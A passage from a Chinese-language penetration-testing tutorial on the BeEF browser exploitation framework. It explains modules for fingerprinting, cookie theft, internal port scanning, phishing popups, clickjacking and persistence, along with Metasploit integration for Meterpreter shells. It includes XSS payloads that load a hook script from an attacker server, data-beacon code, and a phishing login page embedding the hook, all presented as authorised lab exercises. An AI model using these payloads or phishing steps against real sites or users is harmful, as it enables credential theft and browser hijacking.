            if (response.headers.get('content-type').includes('text/html')) {
                // 注入Hook脚本
                // ...
            }
            return response;
        })
    );
});
```

### 3.5 绕过同源策略

同源策略（Same-Origin Policy）是浏览器的核心安全机制，限制了不同源之间的资源访问。BeEF需要多种手段来绕过这一限制。

#### 什么是同源策略

如果两个URL的协议、域名和端口都相同，则它们属于同一个源。

| URL1 | URL2 | 是否同源 | 原因 |
|------|------|---------|------|
| http://a.com/page1 | http://a.com/page2 | 是 | 协议、域名、端口都相同 |
| http://a.com | https://a.com | 否 | 协议不同 |
| http://a.com | http://b.com | 否 | 域名不同 |
| http://a.com:8080 | http://a.com:80 | 否 | 端口不同 |

#### BeEF中的绕过技术

**1. 跨域资源共享（CORS）**

BeEF服务器配置了CORS响应头，允许Hook.js从任何源向BeEF服务器发送请求：

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Content-Type
```

**2. JSONP回调**

对于不支持CORS的旧版浏览器，BeEF使用JSONP方式通信：

```javascript
// 动态创建script标签
var script = document.createElement('script');
script.src = 'http://beef-server:3000/hook?callback=handleResponse&data=' + 
             encodeURIComponent(jsonData);
document.body.appendChild(script);
```

**3. 图片信标（Image Beacon）**

使用Image对象发送简单数据（如心跳）：

```javascript
var img = new Image();
img.src = 'http://beef-server:3000/beacon?data=' + encodeURIComponent(data);
```

**4. 跨域请求骑乘（Cross-Origin Request Riding）**

这是BeEF的一项高级功能，利用被Hook的浏览器作为代理，向其他域发送请求。虽然由于同源策略无法读取响应内容，但可以用于：

- 内网端口扫描（通过加载时间判断端口是否开放）
- CSRF攻击（发送修改状态的请求）
- 内网主机发现

**5. DNS探测绕过**

通过创建指向目标域名的img/script/link标签，触发DNS解析，从而探测内网主机名是否存在，而不受同源策略限制。

**6. WebSocket跨域**

WebSocket协议本身不受同源策略限制（虽然有Origin头检查），BeEF可以利用WebSocket建立跨域通信通道。

---

## 第4章 BeEF核心功能模块

BeEF的功能以模块（Module）的形式组织，每个模块实现特定的功能。截至最新版本，BeEF内置了超过200个模块，按功能分为多个大类。

### 4.1 模块体系概述

#### 模块分类

在BeEF管理界面的右栏"Module Tree"中，模块按树状结构分类组织：

```
Module Tree
├── Browser（浏览器相关）
│   ├── Fingerprint（指纹识别）
│   ├── Hooked Domain（Hook所在域操作）
│   ├── Debug（调试）
│   └── ...
├── Network（网络侦察）
│   ├── Host（主机发现）
│   ├── Port Scan（端口扫描）
│   ├── DNS（DNS探测）
│   └── ...
├── Social Engineering（社会工程）
│   ├── Pretty Theft
│   ├── Clippy
│   ├── Fake Notification Bar
│   └── ...
├── Persistence（持久化）
│   ├── Confirm Close Tab
│   ├── Create Foreground Iframe
│   └── ...
├── Metasploit
├── IPEC（浏览器内命令执行）
├── Mobile（移动设备）
└── WebRTC
```

#### 模块执行状态

每个模块执行后会返回不同的状态结果：

| 状态 | 颜色 | 含义 |
|------|------|------|
| 0 - 未定义 | 灰色 | 模块执行结果未定义 |
| 1 - 成功 | 绿色 | 模块执行成功，达到预期效果 |
| 2 - 执行但不确定 | 橙色 | 模块已执行，但无法确认是否成功 |
| 3 - 执行失败 | 红色 | 模块执行失败 |
| 4 - 不适用 | 蓝色 | 该模块不适用于当前浏览器环境 |

> **截图位置说明**：在BeEF管理界面的"Commands"标签页中，每条已执行的命令前面都有一个颜色标识的状态图标。绿色对勾表示成功，红色叉号表示失败，橙色感叹号表示不确定。

### 4.2 浏览器信息收集

信息收集是渗透测试的第一步，BeEF提供了丰富的浏览器指纹和系统信息收集模块。

#### 4.2.1 浏览器指纹

浏览器指纹是通过收集浏览器的各种特征信息来唯一标识用户的技术。BeEF的指纹信息非常详细。

**User-Agent信息：**
- 浏览器名称和版本（Chrome、Firefox、Safari、Edge、IE等）
- 浏览器渲染引擎（Blink、Gecko、WebKit、Trident）
- 操作系统信息

**插件检测：**
BeEF可以检测浏览器安装的所有插件，包括：
- Adobe Flash Player
- Java Plugin
- Adobe Reader
- Silverlight
- QuickTime
- Windows Media Player
- 各种自定义插件

**操作步骤：**
1. 选中目标浏览器
2. 展开 "Browser" -> "Fingerprint" -> "Browser Fingerprint"
3. 点击"Execute"执行
4. 在"Commands"或"Details"标签页查看结果

> **截图位置说明**：在浏览器详情的"Details"标签页中，可以看到完整的浏览器指纹信息，包括Browser Name、Browser Version、Browser Language、Platform、User-Agent等字段。

**Canvas指纹：**
Canvas指纹利用不同浏览器和系统对Canvas绘图的细微差异来生成唯一标识。

```javascript
// Canvas指纹原理示例
var canvas = document.createElement('canvas');
var ctx = canvas.getContext('2d');
ctx.textBaseline = 'top';
ctx.font = '14px Arial';
ctx.fillText('canvas_fingerprint', 2, 2);
var fingerprint = canvas.toDataURL();
```

**字体检测：**
BeEF可以检测系统中安装的字体列表，这也是重要的指纹特征。

**WebGL指纹：**
通过WebGL API获取显卡信息和渲染特征。

#### 4.2.2 系统信息

BeEF可以收集到的系统信息包括：

| 信息类型 | 具体内容 | 获取方式 |
|---------|---------|---------|
| 操作系统 | Windows/macOS/Linux/Android/iOS | User-Agent、平台检测 |
| 操作系统版本 | Windows 10/11、macOS版本等 | User-Agent解析 |
| 系统架构 | x86/x64/ARM | 平台检测 |
| CPU核心数 | 处理器核心数量 | navigator.hardwareConcurrency |
| 内存大小 | 设备内存 | navigator.deviceMemory |
| 屏幕分辨率 | 屏幕宽高 | screen.width/height |
| 颜色深度 | 屏幕色深 | screen.colorDepth |
| 时区 | 系统时区 | Intl.DateTimeFormat |
| 语言 | 系统语言 | navigator.language |
| 在线状态 | 是否联网 | navigator.onLine |
| 电池状态 | 电量、充电状态 | Battery API |
| 触摸支持 | 是否支持触摸 | Touch事件检测 |

**获取系统信息的模块：**
- Browser Fingerprint：综合浏览器和系统信息
- Get Screen Dimensions：屏幕尺寸
- Get Timezone Offset：时区偏移
- Battery Status：电池状态（移动设备常用）

#### 4.2.3 网络信息

**公网IP地址：**
BeEF可以通过第三方API或自身服务器获取目标的公网IP地址。

> **截图位置说明**：在"Details"标签页的"Network"部分，可以看到Public IP地址和大致的地理位置信息（基于IP数据库）。

**内网IP探测：**
这是BeEF的一项强大功能，利用WebRTC或其他手段探测目标的内网IP地址。

**操作步骤：**
1. 选中目标浏览器
2. 展开 "Network" -> "Host" -> "Get Internal IP"（WebRTC方式）
3. 点击"Execute"执行

**原理说明：**
WebRTC在建立P2P连接时，会向STUN服务器发送请求，请求中包含本地IP地址。通过捕获这些请求，可以获取用户的内网IP。

```javascript
// WebRTC获取内网IP原理
var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
pc.createDataChannel('');
pc.createOffer().then(pc.setLocalDescription.bind(pc));
pc.onicecandidate = function(e) {
    if (e.candidate) {
        var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
        var match = e.candidate.candidate.match(ipRegex);
        if (match) console.log('内网IP:', match[1]);
    }
};
```

**端口扫描：**
BeEF可以利用被Hook的浏览器作为跳板，对内网或特定目标进行端口扫描。

**操作步骤：**
1. 选中目标浏览器
2. 展开 "Network" -> "Port Scanner"
3. 配置参数：
   - **ip**：目标IP地址（如 `192.168.1.1`）
   - **ports**：端口范围（如 `1-1000`）
   - **timeout**：超时时间
4. 点击"Execute"执行

> **截图位置说明**：在"Module Tree" -> "Network" -> "Port Scanner"模块的参数配置区，可以看到ip、ports、timeout等输入框。执行后结果会显示每个端口的状态（开放/关闭/过滤）。

**扫描原理：**
通过创建Image对象，根据图片加载的时间和成功/失败状态来判断端口是否开放。由于同源策略限制，无法读取响应内容，但可以通过加载时间推断端口状态。

#### 4.2.4 历史记录与Cookie获取

**Cookie获取：**
对于Hook所在域的Cookie，BeEF可以直接通过 `document.cookie` 获取。

> **截图位置说明**：在"Details"标签页的"Cookies"部分，列出了当前页面域下的所有Cookie键值对。

**获取Cookie模块：**
1. 展开 "Browser" -> "Hooked Domain" -> "Get Cookie"
2. 输入Cookie名称，或留空获取所有
3. 点击"Execute"

**历史记录探测：**
BeEF可以通过CSS历史记录嗅探技术（已被现代浏览器修复）或其他方式探测用户的浏览历史。

**LocalStorage/SessionStorage获取：**
对于Hook所在域，可以直接读取LocalStorage和SessionStorage的内容。

### 4.3 社会工程模块

社会工程模块是BeEF最具特色也最强大的功能之一，利用人的心理弱点而非技术漏洞来达到攻击目的。

#### 4.3.1 弹窗欺骗

弹窗欺骗通过伪造各种系统或应用程序弹窗，诱导用户进行特定操作。

**Fake Notification Bar（假通知栏）：**
模拟浏览器的通知栏，提示用户需要安装插件或更新软件。

**操作步骤：**
1. 展开 "Social Engineering" -> "Fake Notification Bar"
2. 选择通知类型：
   - **WebRTC**：假的WebRTC权限请求
   - **Java**：假的Java插件更新
   - **Flash**：假的Flash Player更新
   - **Custom**：自定义通知内容
3. 配置通知文本和下载链接
4. 点击"Execute"

> **截图位置说明**：目标浏览器顶部会出现一个仿真的通知栏，外观与浏览器的真实通知栏非常相似。用户点击后会跳转到预设的恶意链接。

**Clippy（助手动画）：**
模拟经典的Office助手（大眼夹），用可爱的动画形象吸引用户注意并诱导操作。

**操作步骤：**
1. 展开 "Social Engineering" -> "Clippy"
2. 配置参数：
   - **message**：显示的消息内容
   - **executable**：用户点击后的下载链接
   - **clippy_id**：助手形象（Clippy/Dot/F1/Genie/Links/Merlin/Rover）
3. 点击"Execute"

**Pretty Theft（精美钓鱼弹窗）：**
一个制作精美的登录弹窗，仿冒各种知名网站的登录界面。

**操作步骤：**
1. 展开 "Social Engineering" -> "Pretty Theft"
2. 选择钓鱼类型：
   - Facebook
   - LinkedIn
   - YouTube
   - Windows
   - 自定义
3. 配置回调URL（用于接收凭证）
4. 点击"Execute"

> **截图位置说明**：目标浏览器页面中央会弹出一个半透明遮罩的登录对话框，外观与对应网站的登录界面高度相似。用户输入用户名和密码后，凭证会被发送到BeEF服务器。

#### 4.3.2 页面注入与替换

**Replace Content（内容替换）：**
替换页面中的指定内容，可用于修改页面信息、插入恶意链接等。

**操作步骤：**
1. 展开 "Browser" -> "Hooked Domain" -> "Replace Content"
2. 配置参数：
   - **old_text**：要替换的旧文本
   - **new_text**：替换后的新文本
3. 点击"Execute"

**Redirect Browser（页面重定向）：**
将当前页面重定向到指定URL。

**操作步骤：**
1. 展开 "Browser" -> "Hooked Domain" -> "Redirect Browser"
2. 输入目标URL
3. 点击"Execute"

**TabNabbing（标签页劫持）：**
当检测到用户切换到其他标签页时，悄悄将当前页面替换为钓鱼页面。用户切回来时往往不会注意到页面已被替换。

**操作步骤：**
1. 展开 "Social Engineering" -> "TabNabbing"
2. 配置钓鱼页面URL
3. 点击"Execute"

#### 4.3.3 点击劫持（Clickjacking）

点击劫持是一种通过在可见页面上覆盖不可见的恶意页面，诱导用户点击的攻击方式。

**BeEF中的点击劫持模块：**

1. **Clickjacking**：基础点击劫持模块
2. **Cursor Spoofing**：伪造鼠标光标位置
3. **Invisible Iframe**：创建透明iframe覆盖层

**Clickjacking模块操作：**
1. 展开 "Social Engineering" -> "Clickjacking"
2. 配置参数：
   - **target_url**：要嵌入的目标页面URL（如设置页面）
   - **button_text**：诱使用户点击的按钮文字
3. 点击"Execute"

**攻击原理：**
```
┌─────────────────────────────────┐
│     诱骗页面（可见）             │
│  ┌─────────────────────────┐    │
│  │  点击这里赢取大奖！     │    │
│  │  [ 立即领取 ]           │    │
│  └─────────────────────────┘    │
│                                 │
│  ┌─────────────────────────┐    │
│  │  透明iframe（不可见）   │    │  ← 实际点击的是这里
│  │  [ 删除账户 ]           │    │
│  └─────────────────────────┘    │
└─────────────────────────────────┘
```

#### 4.3.4 剪贴板劫持

剪贴板劫持可以修改用户剪贴板中的内容，常用于将恶意内容注入到用户的复制操作中。

**操作步骤：**
1. 展开 "Browser" -> "Hooked Domain" -> "Clipboard Event"
2. 配置要注入的内容
3. 点击"Execute"

**攻击场景示例：**
- 用户复制一个命令，粘贴后变成了恶意命令
- 用户复制一个网址，粘贴后变成了钓鱼网站地址
- 用户复制钱包地址，粘贴后变成了攻击者的地址

### 4.4 网络侦察模块

BeEF可以利用被Hook的浏览器作为内网侦察的跳板，因为浏览器处于目标的内网环境中，可以访问内网资源。

#### 4.4.1 内网主机发现

**Ping Sweep（Ping扫描）：**
通过Image对象加载探测内网网段中的存活主机。

**操作步骤：**
1. 展开 "Network" -> "Host" -> "Ping Sweep"
2. 配置参数：
   - **cidr**：目标网段，如 `192.168.1.0/24`
   - **timeout**：超时时间（毫秒）
   - **delay**：每个请求之间的延迟
3. 点击"Execute"

> **截图位置说明**：执行后，在结果中可以看到扫描到的存活主机IP列表。每个IP后面标注了响应状态。

**DNS枚举：**
通过尝试解析常见的内网主机名来发现内网设备。

**操作步骤：**
1. 展开 "Network" -> "DNS" -> "Enumerate Hostnames"
2. 配置域后缀（如 `corp.local`）
3. 点击"Execute"

#### 4.4.2 端口扫描

**Port Scanner模块：**
对指定IP进行端口扫描，发现开放的服务。

**常用端口扫描选项：**
- 快速扫描：扫描常用端口（21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 8080等）
- 全端口扫描：扫描1-65535（耗时较长）
- 自定义端口范围

**扫描结果解读：**
- **Open**：端口开放，可建立连接
- **Closed**：端口关闭，有响应但拒绝连接
- **Filtered**：端口被过滤，无响应

#### 4.4.3 跨域资源探测

**Cross-Origin Resource Scanner：**
探测其他域上的资源是否存在，利用的是资源加载的成功/失败状态。

**应用场景：**
- 探测内网网站是否存在（如 `http://192.168.1.1/admin`）
- 检测用户是否登录了某个网站
- 探测内部服务的版本信息

#### 4.4.4 DNS探测

**DNS Enumeration模块：**
通过创建指向不同子域名的资源请求，触发DNS解析，从而判断哪些子域名真实存在。

**常用的DNS探测模块：**
- **DNS Enumerate Hostnames**：枚举主机名
- **DNS Local Domain**：探测本地域名
- **DNS Rebinding**：DNS重绑定攻击

### 4.5 命令执行模块

#### 4.5.1 浏览器内命令执行

**IPEC（Inter-Process Exploitation Channel）：**
BeEF的浏览器内命令执行技术，利用Java、Flash等插件在浏览器沙箱外执行命令。

**Java Applet命令执行：**
如果目标浏览器安装了Java插件且安全设置较低，可以通过签名的Java Applet执行系统命令。

**操作步骤：**
1. 确保目标浏览器安装了Java插件
2. 展开 "IPEC" -> "Java Payload"
3. 配置Payload参数
4. 点击"Execute"

> **注意**：现代浏览器大多已默认禁用Java插件，此方法成功率较低。

#### 4.5.2 配合Metasploit获取Shell

BeEF可以与Metasploit无缝集成，通过浏览器投递Metasploit的Payload，获取系统级Shell。

**集成方式（详见第5章）：**
1. 配置BeEF的Metasploit扩展
2. 启动Metasploit的RPC服务
3. 在BeEF中选择对应的Exploit模块
4. 针对目标浏览器执行

#### 4.5.3 Java/Flash利用

**Java利用模块：**
- Java Payload：执行Java Payload
- Java Applet Reverse TCP：反向TCP连接
- Java 0-day（历史漏洞）

**Flash利用模块：**
- Flash ActionScript注入
- Flash参数注入
- Flash XSS利用

> **注意**：随着Flash的退役和Java插件的禁用，这类模块在现代环境中的适用性越来越低，但在老旧系统中仍可能有效。

---

## 第5章 高级模块使用

### 5.1 Metasploit集成

BeEF与Metasploit的集成是其最强大的功能之一，可以将浏览器级别的访问提升为系统级别的访问。

#### 5.1.1 集成架构

```
┌─────────────┐   RPC/HTTP   ┌──────────────┐
│  BeEF UI    │<────────────>│  Metasploit  │
│  Server     │              │  Framework   │
└──────┬──────┘              └──────┬───────┘
       │                            │
       │ HTTP/WebSocket             │ Payload
       ▼                            ▼
┌──────────────────────────────────────────┐
│           Hooked Browser                │
│  (BeEF Hook.js + MSF Payload 投递)       │
└──────────────────────────────────────────┘
```

#### 5.1.2 配置Metasploit集成

**步骤一：启动Metasploit RPC服务**

```bash
# 方法1：使用msfconsole启动
msfconsole
msf> load msgrpc ServerHost=0.0.0.0 ServerPort=55552 User=msf Pass=abc123 SSL=y

# 方法2：使用msfrpcd启动
msfrpcd -P abc123 -S -U msf -a 0.0.0.0 -p 55552
```

**步骤二：配置BeEF的Metasploit扩展**

编辑 `config.yaml`：

```yaml
extensions:
  metasploit:
    enable: true
    name: 'Metasploit'
    host: '127.0.0.1'
    port: 55552
    user: 'msf'
    pass: 'abc123'
    uri: '/api/'
    ssl: true
    ssl_verify: false
    callback_host: '192.168.1.100'  # BeEF服务器IP
    callback_port: '2000'          # 反向连接端口
```

**步骤三：重启BeEF**

```bash
./beef -x  # -x 参数重置数据库（可选）
```

启动成功后，在模块树中会出现 "Metasploit" 分类，列出所有可用的MSF模块。

> **截图位置说明**：配置成功后，右栏Module Tree底部会出现"Metasploit"分类，展开后可以看到按类型组织的Metasploit模块列表，包括browser、exploit、payload、auxiliary等子分类。

#### 5.1.3 获取Meterpreter会话

**操作步骤：**

1. **选择合适的Exploit模块**
   - 根据目标浏览器类型和系统选择对应的Exploit
   - 常用的有：`browser/browser_autopwn2`（浏览器自动攻击）

2. **配置模块参数**
   - SRVHOST：监听地址
   - SRVPORT：监听端口
   - PAYLOAD：使用的Payload（如 `windows/meterpreter/reverse_tcp`）
   - LHOST：本地监听地址
   - LPORT：本地监听端口

3. **执行模块**
   - 点击"Execute"启动Exploit
   - BeEF会生成一个恶意URL
   - 将目标浏览器重定向到该URL

4. **获取会话**
   - 如果Exploit成功，将获得一个Meterpreter会话
   - 在msfconsole中可以用 `sessions -i <id>` 交互

**使用Browser Autopwn2的完整流程：**

```bash
# 1. 启动Metasploit RPC服务
msfrpcd -P abc123 -S -U msf

# 2. 启动BeEF（已配置好MSF集成）
./beef

# 3. 在BeEF界面中Hook目标浏览器

# 4. 执行 Metasploit -> browser -> browser_autopwn2
#    配置LHOST和LPORT

# 5. 在msfconsole中查看会话
msfconsole
msf> sessions -l
msf> sessions -i 1
meterpreter>
```

### 5.2 社会工程模块详解

#### 5.2.1 Pretty Theft（精美钓鱼）

Pretty Theft是BeEF中最受欢迎的社会工程模块之一，提供多种高仿真度的钓鱼弹窗。

**支持的钓鱼模板：**

| 模板名称 | 适用场景 | 可信度 |
|---------|---------|--------|
| Facebook | Facebook用户 | 高 |
| LinkedIn | 职场社交用户 | 高 |
| YouTube | 视频网站用户 | 中高 |
| Windows | Windows系统用户 | 中 |
| Yahoo | Yahoo邮箱用户 | 中 |
| 自定义 | 任意场景 | 取决于制作 |

**自定义钓鱼模板开发要点：**
1. 仿冒目标网站的UI风格
2. 使用真实的Logo和配色
3. 编写逼真的提示文案
4. 添加加载动画增加真实感
5. 错误提示与真实网站一致

**凭证接收与处理：**
用户输入的凭证会通过HTTP请求发送到BeEF服务器，存储在数据库中，可在管理界面查看。

#### 5.2.2 Clippy（助手动画）

Clippy模块利用怀旧的Office助手形象进行社会工程攻击，降低用户的警惕性。

**可用的助手形象：**
- **Clippy**：经典的回形针助手
- **Dot**：彩色圆点
- **F1**：赛车形象
- **Genie**：精灵形象
- **Links**：猫咪形象
- **Merlin**：魔术师形象
- **Rover**：小狗形象

**攻击流程：**
1. 助手动画出现在页面角落
2. 显示友好的问候消息
3. 引导用户点击下载按钮
4. 用户下载并执行恶意程序

#### 5.2.3 Google Phishing（谷歌钓鱼）

仿冒Google登录页面的钓鱼模块，外观高度仿真。

**操作步骤：**
1. 展开 "Social Engineering" -> "Google Phishing"
2. 配置回调URL
3. 点击"Execute"

> **截图位置说明**：执行后目标浏览器页面会被替换为仿冒的Google账户登录页面，包含邮箱/电话输入框、下一步按钮、Google Logo等元素，外观与真实页面几乎一致。

#### 5.2.4 其他社工模块

- **Fake Flash Update**：假的Flash Player更新提示
- **Fake AV Update**：假的杀毒软件更新
- **Lcamtuf Download**：利用浏览器下载对话框欺骗
- **Simple Hijacker**：简单的页面劫持
- **Massive Phishing**：大规模钓鱼模块

### 5.3 网络模块

#### 5.3.1 DNS枚举

**DNS枚举模块列表：**

| 模块名称 | 功能描述 |
|---------|---------|
| DNS Enumerate Hostnames | 枚举常见主机名 |
| DNS Local Domain | 探测本地域名 |
| DNS Tunneling | DNS隧道（实验性） |
| DNS Rebind | DNS重绑定攻击 |

**DNS枚举操作：**

1. 展开 "Network" -> "DNS" -> "Enumerate Hostnames"
2. 配置参数：
   - **domain**：目标域名（如 `company.com`）
   - **wordlist**：子域名字典（可选）
3. 点击"Execute"

**DNS重绑定攻击（DNS Rebinding）：**
DNS重绑定是一种绕过同源策略的攻击技术，通过快速修改DNS解析结果，将域名从攻击者IP指向内网IP，从而读取内网资源。

BeEF的DNS Rebind模块可以：
- 访问内网Web服务
- 绕过同源策略读取响应
- 攻击路由器管理界面

#### 5.3.2 Ping扫描

**Ping Sweep模块详解：**

- **原理**：利用浏览器加载图片/资源的时间差异判断主机是否存活
- **支持的协议**：HTTP/HTTPS
- **扫描速度**：可调（影响扫描速度和隐蔽性）
- **结果准确度**：中等（受网络延迟和超时设置影响）

**高级参数配置：**
- `max_connections`：最大并发连接数
- `timeout`：单个请求超时时间
- `delay_between_requests`：请求间延迟
- `verify_timeout`：验证超时阈值

#### 5.3.3 端口扫描

**Port Scanner模块详解：**

**扫描方式：**
1. **Image-based**：基于图片加载时间（最常用）
2. **XHR-based**：基于XMLHttpRequest（仅适用于CORS场景）
3. **WebSocket-based**：基于WebSocket连接时间

**常用端口配置：**

| 端口 | 服务 | 扫描意义 |
|------|------|---------|
| 21 | FTP | 文件传输服务 |
| 22 | SSH | 远程登录 |
| 23 | Telnet | 远程终端 |
| 25 | SMTP | 邮件发送 |
| 53 | DNS | 域名解析 |
| 80 | HTTP | Web服务 |
| 110 | POP3 | 邮件接收 |
| 135 | RPC | Windows RPC |
| 139 | NetBIOS | Windows文件共享 |
| 143 | IMAP | 邮件接收 |
| 443 | HTTPS | 加密Web服务 |
| 445 | SMB | Windows文件共享 |
| 3306 | MySQL | 数据库 |
| 3389 | RDP | 远程桌面 |
| 5900 | VNC | 远程桌面 |
| 6379 | Redis | 缓存服务 |
| 8080 | HTTP代理 | 代理/备用Web |
| 8443 | HTTPS-alt | 备用HTTPS |

### 5.4 持久化模块

#### 5.4.1 Cookie注入持久化

**原理**：在目标浏览器的Cookie中植入BeEF的会话标识，使用户在同一网站的后续访问中自动被Hook。

**操作步骤：**
1. 展开 "Persistence" -> "Cookie"
2. 配置Cookie的域名、路径和过期时间
3. 点击"Execute"

#### 5.4.2 LocalStorage持久化

**原理**：利用浏览器的LocalStorage存储Hook信息，页面刷新后自动重建连接。

**适用场景：**
- 同源页面间保持连接
- 长期跟踪用户浏览器

#### 5.4.3 Iframe持久化

**Create Foreground Iframe模块：**
这是最常用的持久化技术之一。

**工作原理：**
```
执行前：
┌──────────────────────────┐
│   原始页面（含Hook）      │
│   (用户正在浏览)          │
└──────────────────────────┘

执行后：
┌──────────────────────────┐
│  全屏iframe（用户看到的）  │  ← 用户继续浏览
│  ┌────────────────────┐  │
│  │  目标网站内容      │  │
│  └────────────────────┘  │
│                          │
│  父页面（隐藏，含Hook）   │  ← 保持连接
└──────────────────────────┘
```

**操作步骤：**
1. 展开 "Persistence" -> "Create Foreground Iframe"
2. 配置 `target` 参数（用户继续浏览的URL）
3. 点击"Execute"

#### 5.4.4 Man-In-The-Browser

**中间人浏览器（MITB）**是一种高级持久化技术，在浏览器和用户之间插入一个代理层。

BeEF中的相关模块：
- **Rider**：请求骑乘，通过被Hook的浏览器发送请求
- **Proxy**：将Hooked浏览器作为HTTP代理

### 5.5 移动设备模块

BeEF对移动设备浏览器也有专门的支持和模块。

#### 5.5.1 移动设备检测

BeEF会自动识别移动设备浏览器，并在界面上用不同的图标标识。

**可识别的移动平台：**
- Android（Chrome、Firefox、原生浏览器）
- iOS（Safari、Chrome for iOS）
- Windows Phone
- 其他移动设备

#### 5.5.2 移动设备专用模块

| 模块名称 | 功能描述 | 平台支持 |
|---------|---------|---------|
| Vibrate | 触发设备震动 | Android/Firefox |
| Geolocation | 获取地理位置（需用户授权） | 所有现代浏览器 |
| Orientation | 获取设备方向 | 移动设备 |
| NFC | NFC相关操作 | Android Chrome |
| SMS | 发送短信（需用户确认） | 移动设备 |
| Call Phone | 拨打电话（需用户确认） | 移动设备 |
| Battery Status | 获取电池状态 | 移动设备/笔记本 |

**获取地理位置：**
1. 展开 "Mobile" -> "Geolocation"
2. 配置提示文案（增加用户授权几率）
3. 点击"Execute"

> **截图位置说明**：目标手机浏览器会弹出位置权限请求对话框。如果用户同意，BeEF将获得精确的经纬度坐标。

### 5.6 WebRTC模块

WebRTC（Web Real-Time Communication）是浏览器的实时通信技术，BeEF利用它可以实现一些独特的功能。

#### 5.6.1 内网IP泄露

这是最广为人知的WebRTC安全问题，可以绕过VPN获取用户的真实内网IP。

**操作步骤：**
1. 展开 "Network" -> "Host" -> "Get Internal IP WebRTC"
2. 点击"Execute"
3. 在结果中查看内网IP地址

**防御方法：**
- 使用WebRTC Leak Prevent等浏览器扩展
- 在浏览器设置中禁用WebRTC
- 使用基于路由的VPN而非浏览器级代理

#### 5.6.2 摄像头/麦克风访问

WebRTC可以访问设备的摄像头和麦克风，但需要用户明确授权。

**相关模块：**
- **Get Camera**：获取摄像头权限并拍照
- **Get Microphone**：获取麦克风权限并录音
- **Webcam Snap**：摄像头快照

**操作步骤（摄像头模块）：**
1. 展开 "Browser" -> "Webcam" -> "Webcam Snap"
2. 配置参数：
   - **ask_permission**：是否请求权限
   - **quality**：图片质量
3. 点击"Execute"

> **注意**：现代浏览器要求HTTPS才能访问摄像头和麦克风，且会向用户显示明确的权限请求提示。通过社会工程手段（如谎称需要视频验证）可以提高用户授权的概率。

#### 5.6.3 P2P通信

WebRTC可以建立浏览器之间的P2P连接，BeEF利用这一点可以：

- 浏览器之间直接通信（不经过BeEF服务器）
- 内网浏览器之间的横向移动
- 分布式端口扫描

---

## 第6章 实战案例

本章通过五个完整的实战案例，演示BeEF在不同场景下的应用。所有案例均为授权环境下的学习演示，请勿用于非法用途。

### 6.1 案例1：利用XSS Hook浏览器进行信息收集

#### 场景描述

目标网站存在存储型XSS漏洞，位于用户评论功能处。通过在评论中植入BeEF Hook，获取访问该页面用户的浏览器信息。

#### 实验环境

| 角色 | 操作系统 | IP地址 | 软件 |
|------|---------|--------|------|
| BeEF服务器 | Kali Linux | 192.168.1.100 | BeEF 0.5.4 |
| 目标网站 | Ubuntu 20.04 | 192.168.1.200 | Nginx + PHP + 留言板 |
| 受害者 | Windows 10 | 192.168.1.50 | Chrome 120 |

#### 攻击步骤

**步骤一：启动BeEF服务器**

```bash
# 启动BeEF
cd /usr/share/beef-xss/
sudo ./beef
```

确认Hook URL为 `http://192.168.1.100:3000/hook.js`

**步骤二：寻找XSS注入点**

1. 访问目标网站 `http://192.168.1.200/guestbook.php`
2. 在评论输入框中输入测试Payload：
   ```html
   <script>alert('XSS')</script>
   ```
3. 提交评论，刷新页面，确认弹窗出现

> **截图位置说明**：浏览器弹出显示"XSS"的alert对话框，确认存储型XSS漏洞存在。

**步骤三：注入BeEF Hook**

在评论框中提交以下内容：

```html
<script src="http://192.168.1.100:3000/hook.js"></script>
```

如果script标签被过滤，尝试绕过方式：

```html
<img src=x onerror="this.onerror=function(){};document.body.appendChild(document.createElement('script')).src='http://192.168.1.100:3000/hook.js'">
```

**步骤四：等待受害者访问**

当受害者浏览包含恶意评论的页面时，浏览器会自动加载Hook.js并连接BeEF服务器。

**步骤五：在BeEF中查看Hooked浏览器**

1. 打开BeEF管理界面 `http://192.168.1.100:3000/ui/panel`
2. 在左栏"Hooked Browsers"中找到新上线的浏览器
3. 点击该浏览器条目，在中栏"Details"标签页查看详细信息

> **截图位置说明**：左栏显示绿色在线状态的浏览器条目，显示IP为192.168.1.50，浏览器图标为Chrome，系统图标为Windows。中栏Details页面显示完整的浏览器指纹信息。

**步骤六：执行信息收集模块**

依次执行以下模块收集信息：

1. **Browser Fingerprint**（Browser -> Fingerprint）
   - 获取完整浏览器指纹

2. **Get Internal IP WebRTC**（Network -> Host）
   - 获取内网IP地址

3. **Get Cookie**（Browser -> Hooked Domain）
   - 获取目标网站的Cookie

4. **Get Page Links**（Browser -> Hooked Domain）
   - 获取页面上的所有链接

5. **Get Screen Dimensions**（Browser -> Fingerprint）
   - 获取屏幕分辨率

> **截图位置说明**：在"Commands"标签页中，可以看到已执行的命令列表及其状态。绿色对勾表示成功执行的模块，点击可以查看详细结果。

#### 案例总结

本案例演示了最基础的BeEF使用场景：利用XSS漏洞Hook浏览器并收集信息。这是BeEF攻击链的起点，后续的更高级攻击都建立在成功Hook的基础上。

### 6.2 案例2：钓鱼页面+BeEF获取凭证

#### 场景描述

制作一个仿冒企业邮箱登录页面的钓鱼页面，嵌入BeEF Hook，既获取用户的登录凭证，又建立对浏览器的持久控制。

#### 实验环境

| 角色 | 操作系统 | IP地址 | 软件 |
|------|---------|--------|------|
| BeEF+钓鱼服务器 | Kali Linux | 192.168.1.100 | BeEF + Apache |
| 受害者 | Windows 10 | 192.168.1.50 | Chrome + Edge |

#### 攻击步骤

**步骤一：准备钓鱼页面**

创建钓鱼页面 `phishing.html`：

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>企业邮箱登录 - XX科技有限公司</title>
    <!-- BeEF Hook -->
    <script src="http://192.168.1.100:3000/hook.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: "Microsoft YaHei", Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            width: 380px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 8px;
        }
        .logo p {
            color: #999;
            font-size: 14px;
        }
        .form-group {
